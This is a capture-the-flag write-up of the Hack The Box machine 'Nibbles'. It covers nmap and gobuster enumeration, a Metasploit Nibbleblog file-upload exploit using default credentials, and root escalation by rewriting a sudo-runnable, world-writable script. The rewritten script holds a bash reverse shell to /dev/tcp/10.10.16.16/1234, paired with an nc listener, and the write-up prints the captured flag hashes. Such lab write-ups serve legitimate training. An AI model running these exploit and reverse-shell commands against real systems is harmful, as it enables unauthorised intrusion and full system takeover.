@@ -1,0 +1,255 @@
+# HTB - Nibbles
+
+Target IP - 10.10.10.75
+
+## Enumeration
+
+#### Nmap
+
+To first enumerate the system we will run an nmap scan using the following options:
+
+```
+nmap -sC -sV -p- -vv --min-rate 10000 10.10.10.75
+```
+
+From this command we receive the two ports that are available:
+
+![[Pasted image 20250115135216.png]]
+
+#### Website
+
+On port 80 we see there is a web server, so we will head to `http://10.10.10.75` and there we see the following:
+
+![[Pasted image 20250115135327.png]]
+
+And that's it, there is nothing there. However, if we open the source code, we see the following comment.
+
+![[Pasted image 20250115135421.png]]
+
+The comment suggests that there is a `/nibbleblog` directory. Heading to that directory we see the following:
+
+![[Pasted image 20250115135557.png]]
+
+This seems to be some sort of blog however, there seems to be no content and none of the links work. Maybe there are some hidden directories, to find them we will make use of gobuster:
+
+```
+gobuster dir -u http://10.10.10.75/nibbleblog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+From the results of this gobuster scan we see the following directories:
+
+![[Pasted image 20250115153803.png]]
+
+Heading to the `README` directory, we are able to see the version number of the application. The version number is v4.0.3 of Nibbleblog.
+
+## Exploit - Shell as nibbler
+
+Now searching for vulnerabilities using searchsploit, we see the following vulnerability:
+
+![[Pasted image 20250115154203.png]]
+
+It seems to be a metasploit module, so we will head into metasploit to exploit the application. We use the following commands:
+
+```
+msfconsole
+use exploit/multi/http/nibbleblog_file_upload
+```
+
+However, we are required to be authenticated in order to exploit the application, this means provide username and password. To do so we need to find some credentials within the application but before we do so we will check the default credentials which are:
+
+```
+Username: admin
+Password: nibbles
+```
+
+Providing these credentials to the metasploit module like the following, we are able to obtain a shell on the system.
+
+```
+set RHOSTS 10.10.10.75
+set LHOST 10.10.16.16
+set TARGETURI /nibbleblog
+set USERNAME admin
+set PASSWORD nibbles
+exploit
+```
+
+Now we have a meterpreter shell on the system:
+
+![[Pasted image 20250115154928.png]]
+
+Typing `shell` we are able to obtain a shell on the system.
+Heading to the home directory for nibbler we see the user.txt file which reads the following:
+
+```
+cat user.txt
+79b6879ae93884e50a27758b11d65a27
+```
+
+## Shell as root
+
+Additionally, in the same directory we see a `personal.zip` file by unzipping the file we see a script that reads the following:
+
+```
+                  ####################################################################################################
+                  #                                        Tecmint_monitor.sh                                        #
+                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
+                  # If any bug, report us in the link below                                                          #
+                  # Free to use/edit/distribute the code below by                                                    #
+                  # giving proper credit to Tecmint.com and Author                                                   #
+                  #                                                                                                  #
+                  ####################################################################################################
+#! /bin/bash
+# unset any variable which system may be using
+
+# clear the screen
+clear
+
+unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage
+
+while getopts iv name
+do
+        case $name in
+          i)iopt=1;;
+          v)vopt=1;;
+          *)echo "Invalid arg";;
+        esac
+done
+
+if [[ ! -z $iopt ]]
+then
+{
+wd=$(pwd)
+basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
+scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
+su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
+}
+fi
+
+if [[ ! -z $vopt ]]
+then
+{
+echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
+}
+fi
+
+if [[ $# -eq 0 ]]
+then
+{
+
+
+# Define Variable tecreset
+tecreset=$(tput sgr0)
+
+# Check if connected to Internet or not
+ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"
+
+# Check OS Type
+os=$(uname -o)
+echo -e '\E[32m'"Operating System Type :" $tecreset $os
+
+# Check OS Release Version and Name
+cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
+echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
+echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"
+
+# Check Architecture
+architecture=$(uname -m)
+echo -e '\E[32m'"Architecture :" $tecreset $architecture
+
+# Check Kernel Release
+kernelrelease=$(uname -r)
+echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease
+
+# Check hostname
+echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME
+
+# Check Internal IP
+internalip=$(hostname -I)
+echo -e '\E[32m'"Internal IP :" $tecreset $internalip
+
+# Check External IP
+externalip=$(curl -s ipecho.net/plain;echo)
+echo -e '\E[32m'"External IP : $tecreset "$externalip
+
+# Check DNS
+nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
+echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 
+
+# Check Logged In Users
+who>/tmp/who
+echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 
+
+# Check RAM and SWAP Usages
+free -h | grep -v + > /tmp/ramcache
+echo -e '\E[32m'"Ram Usages :" $tecreset
+cat /tmp/ramcache | grep -v "Swap"
+echo -e '\E[32m'"Swap Usages :" $tecreset
+cat /tmp/ramcache | grep -v "Mem"
+
+# Check Disk Usages
+df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
+echo -e '\E[32m'"Disk Usages :" $tecreset 
+cat /tmp/diskusage
+
+# Check Load Average
+loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
+echo -e '\E[32m'"Load Average :" $tecreset $loadaverage
+
+# Check System Uptime
+tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
+echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime
+
+# Unset Variables
+unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage
+
+# Remove Temporary Files
+rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
+}
+fi
+shift $(($OPTIND -1))
+```
+
+Also, looking at the permissions of the file, we see that we are able to edit the file. On top of that we also check if we can run any sudo commands, in which, the actual script file is a script that we can run as root.
+
+```
+ls -la             
+total 12
+drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .                                 
+drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..                               
+-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
+
+sudo -l
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+```
+
+Seeing this, we are able to edit the file to make a reverse shell back open up as root.
+To do so, we will run the following commands:
+
+```
+# target machine
+echo "#!/bin/bash" > monitor.sh
+echo "/bin/bash -i >& /dev/tcp/10.10.16.16/1234 0>&1" >> monitor.sh
+# attacker machine
+nc -lvnp 1234
+# target machine
+sudo /home/nibbler/personal/stuff/monitor.sh
+```
+
+Now we have root on the target system:
+
+```
+root@Nibbles:/home/nibbler/personal/stuff# whoami
+whoami
+root
+```
+
+Heading to the root directory we see the root.txt:
+
+```
+cat root.txt
+de7fd09a6cf3a2904674f12f5ea1dc6b
+```
